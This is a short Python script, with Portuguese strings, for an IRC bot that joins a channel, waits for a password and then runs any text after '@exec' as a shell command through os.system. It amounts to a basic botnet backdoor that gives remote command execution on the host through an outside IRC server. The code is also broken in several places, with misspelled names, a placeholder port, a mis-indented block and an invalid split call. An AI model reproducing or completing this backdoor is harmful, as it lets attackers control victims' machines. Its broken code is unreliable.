#conding: utf-8

import socket, os
import sys
import time
import random
from re import search
import ctypes, sys

def color(text, color):
	std = ctypes.windll.kernel32.GetStdHandler(-11)
	for i in range(0, len(color)):
		ctypes.windll.kernel32.SetConsoleTextAttribute(std, color[i])
		sys.stdout.write(text)
	ctypes.windll.kernel32.SetConsoleTextAttribute(std, 7)


sever = "irc address"
port = port number
canal = "#HashtagName"
nick = "bot"
senha = "123"

c = random.randint(0, 10000)
nick = nick + str(c)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connet((server, port))
s.send("NICK %s\r\n" % (nick))
s.send("USER "+ nick + " " + nick + " :.\n")
s.send("Join %s\r\n", (canal))
time.sleep(2)

verif = False
if verif != True:
	dados = s.recv(5000)
	color(dados, color=[9])
	if dados[0:4] == "PING":
	s.send(dados.replace("PING", "PONG"))
	
if search("@conn %s" % senha, dados):
	s.send("PRIVMSG %s : Connectado com sucesso! " % (canal))
	verif = True
	
while(1):
	dados = s.recv(5000)
	color(dados, color=2)
	if dados[0:4] == "PING":
		s.send(dados.replace("PING", "PONG"))
		
	if search("@exec", dados):
		dados = dados.split("@exec")
		dados = dados[1]/split("\r\n")
		os.system(dados[0])
		s.send("PRIVMSG %s : Comando executado com sucesso! " % (canal))